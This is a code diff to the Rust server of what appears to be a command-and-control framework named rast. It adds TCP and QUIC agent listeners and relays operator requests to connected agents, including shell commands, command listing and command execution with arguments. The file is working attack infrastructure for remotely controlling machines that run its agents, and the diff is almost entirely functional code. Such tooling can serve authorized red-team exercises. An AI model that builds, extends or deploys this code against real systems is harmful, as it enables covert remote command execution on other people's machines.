@@ -1,44 +1,43 @@
-use std::{
-    collections::HashMap,
-    net::SocketAddr,
-    ops::{Deref, DerefMut},
-    sync::Arc,
-    vec,
-};
+//! C2 implementation.
 
-use anyhow::{Error, Result};
-use bidirectional_channel::{bounded, ReceivedRequest, Requester, Responder};
-use bytes::Bytes;
+use std::{collections::HashMap, net::SocketAddr, sync::Arc, vec};
+
+use anyhow::{bail, Error, Result};
+use bidirectional_channel::ReceivedRequest;
 use futures_util::{sink::SinkExt, stream::StreamExt};
 use rast::{
+    encoding::{JsonPackager, Packager},
     messages::{
         c2_agent::{AgentMessage, AgentResponse, C2Request},
-        ui_request::*,
+        ui_request::{IpData, UiRequest, UiResponse},
     },
-    protocols::{tcp::TcpFactory, *},
-    settings::Settings,
+    protocols::{
+        quic::QuicFactory, tcp::TcpFactory, Messager, ProtoConnection, ProtoFactory, ProtoServer,
+    },
+    settings::{Connection, Settings},
+    RastError,
 };
 use tokio::{
     sync::{
-        mpsc::{unbounded_channel, UnboundedReceiver, UnboundedSender},
-        watch::{self, Receiver},
+        mpsc::{unbounded_channel, UnboundedReceiver},
         Mutex,
     },
     task::JoinHandle,
 };
-use tokio_util::codec::{BytesCodec, Framed};
-use tracing::{info, instrument};
+use tracing::{debug, info, trace};
 
 use crate::c2::ui_manager::UiManager;
 
 mod ui_manager;
 
+#[doc(hidden)]
 #[derive(Debug)]
 pub enum Dummy {
     Nothing,
 }
 
 // TODO: implement
+#[doc(hidden)]
 pub enum C2Notification {
     AgentConnected(SocketAddr),
     AgentDisconnected(SocketAddr),
@@ -53,25 +52,36 @@ pub struct RastC2 {
 }
 
 impl RastC2 {
+    /// Creates new instance using provided [Settings].
     pub async fn with_settings(settings: Settings) -> Result<Self> {
         let (ctx, crx) = unbounded_channel();
         let mut servers = vec![];
 
-        if let Some(conf) = &settings.server.tcp {
-            let server = TcpFactory::new_server(conf).await?;
-            let cloned = ctx.clone();
-            let task = tokio::spawn(async move {
-                loop {
-                    if let Ok(conn) = server.get_conn().await {
-                        cloned.send(conn);
+        for conf in settings.server.agent_listeners.iter() {
+            let server = match conf {
+                Connection::Tcp(tcp_conf) => TcpFactory::new_server(tcp_conf).await,
+                Connection::Quic(quic_conf) => QuicFactory::new_server(quic_conf).await,
+                _ => bail!(RastError::Unknown),
+            };
+
+            if let Ok(server) = server {
+                info!("Creating agent listener at: {server:?}");
+                let cloned = ctx.clone();
+                let task = tokio::spawn(async move {
+                    loop {
+                        if let Ok(conn) = server.get_conn().await {
+                            if let Err(e) = cloned.send(conn) {
+                                debug!("Failed to pass agent connection to C2: {:?}", e);
+                            };
+                        }
                     }
-                }
-            });
-            servers.push(task);
+                });
+                servers.push(task);
+            }
         }
 
-        let ui = if let Some(conf) = &settings.server.ui {
-            let ui = UiManager::with_settings(conf).await?;
+        let ui = if !&settings.server.ui_listeners.is_empty() {
+            let ui = UiManager::with_settings(&settings).await?;
             Some(ui)
         } else {
             None
@@ -88,37 +98,43 @@ impl RastC2 {
             ui,
         };
 
-        info!("RastC2 instance created");
-
         Ok(rastc2)
     }
 
+    /// Starts C2 server.
     pub async fn run(&mut self) -> Result<()> {
         info!("RastC2 instance running");
         loop {
             while let Ok(conn) = self.connections_rx.try_recv() {
-                info!("Received agent connection");
+                info!(
+                    "Received agent connection from: {:?}",
+                    conn.lock().await.remote_addr()
+                );
                 self.add_connection(conn).await?;
+                debug!("Added agent connection");
             }
 
             if let Some(ui) = &self.ui {
                 while let Ok(req) = ui.try_recv_request() {
-                    info!("Received UI request");
-                    self.handle_ui_request(req).await;
+                    trace!("Received UI request");
+                    if let Err(e) = self.handle_ui_request(req).await {
+                        debug!("Failed to handle UI request: {:?}", e);
+                    };
                 }
             }
         }
     }
 
-    #[tracing::instrument]
+    // #[tracing::instrument]
     async fn add_connection(&mut self, conn: Arc<Mutex<dyn ProtoConnection>>) -> Result<()> {
-        let ip = conn.lock().await.get_ip()?;
+        let ip = conn.lock().await.remote_addr()?;
         self.connections.insert(ip, conn);
         Ok(())
     }
 
     async fn handle_ui_request(&self, req: ReceivedRequest<UiRequest, UiResponse>) -> Result<()> {
-        info!("{:?}", req.as_ref());
+        trace!("{:?}", req.as_ref());
+        let packager = JsonPackager::default();
         let response = match req.as_ref() {
             UiRequest::Ping => UiResponse::Pong,
             UiRequest::GetIps => {
@@ -130,28 +146,77 @@ impl RastC2 {
                 let ipdata = IpData { ip: *ip };
                 UiResponse::GetIpData(ipdata)
             },
-            UiRequest::Command(ip, cmd) => {
+            UiRequest::ShellRequest(ip, cmd) => {
                 let conn = self.connections.get(ip).unwrap();
                 let mut conn = conn.lock().await;
 
                 // TODO: put all of that into struct and do abstractions
-                let mut frame = get_rw_frame(conn.deref_mut(), BytesCodec::new());
+                let mut messager = Messager::new(&mut *conn);
 
-                let request = AgentMessage::C2Request(C2Request::ExecCommand(cmd.to_string()));
-                let request = serde_json::to_vec(&request)?;
+                let request = AgentMessage::C2Request(C2Request::ExecShell(cmd.to_string()));
+                let request = packager.encode(&request)?;
 
-                let result = frame.send(Bytes::from(request)).await;
-                let bytes = frame.next().await.unwrap().unwrap();
+                let _result = messager.send(request).await;
+                let bytes = messager.next().await.unwrap().unwrap();
 
-                let output = serde_json::from_slice(bytes.as_ref());
+                let output = packager.decode(&bytes.into());
                 let output = output?;
-                let AgentMessage::AgentResponse(AgentResponse::CommandResponse(output)) = output else { todo!()};
+                let AgentMessage::AgentResponse(AgentResponse::ShellResponse(output)) = output else { todo!()};
 
-                UiResponse::Command(output)
+                UiResponse::ShellOutput(output)
+            },
+            UiRequest::GetCommands(ip) => {
+                let conn = self.connections.get(ip).unwrap();
+                let mut conn = conn.lock().await;
+
+                // TODO: put all of that into struct and do abstractions
+                let mut messager = Messager::new(&mut *conn);
+
+                let request = AgentMessage::C2Request(C2Request::GetCommands);
+                let request = packager.encode(&request)?;
+
+                let _result = messager.send(request).await;
+                let bytes = messager.next().await.unwrap().unwrap();
+
+                let output = packager.decode(&bytes.into());
+                let output = output?;
+                let AgentMessage::AgentResponse(AgentResponse::Commands(commands)) = output else { todo!()};
+
+                UiResponse::Commands(commands)
+            },
+            UiRequest::ExecCommand(ip, command, args) => {
+                let conn = self.connections.get(ip).unwrap();
+                let mut conn = conn.lock().await;
+
+                // TODO: put all of that into struct and do abstractions
+                let mut messager = Messager::new(&mut *conn);
+
+                let request = AgentMessage::C2Request(C2Request::ExecCommand(
+                    command.to_string(),
+                    args.clone(),
+                ));
+                let request = packager.encode(&request)?;
+
+                let _result = messager.send(request).await;
+                let bytes = messager.next().await.unwrap().unwrap();
+
+                let output = packager.decode(&bytes.into());
+                let msg: AgentMessage = output?;
+                let output = match msg {
+                    AgentMessage::C2Request(_) => unreachable!(),
+                    AgentMessage::AgentResponse(resp) => match resp {
+                        AgentResponse::CommandOutput(output) => output,
+                        AgentResponse::Error(err) => err,
+                        _ => unreachable!(),
+                    },
+                };
+
+                UiResponse::CommandOutput(output)
             },
         };
-        info!("{:?}", response);
+        trace!("{:?}", response);
         let result = req.respond(response);
+        trace!("{:?}", result);
         Ok(())
     }
 }
